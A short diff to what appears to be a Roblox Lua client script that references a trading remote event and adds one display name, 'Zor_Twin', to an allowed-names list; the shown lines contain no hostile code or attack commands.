@@ -5,6 +5,7 @@ local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 local event = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
 local ALLOWED_DISPLAY_NAMES = {
+    "Zor_Twin",
     "Zor_Twin1",
     "Zor_Twin2",
     "Zor_Twin3",
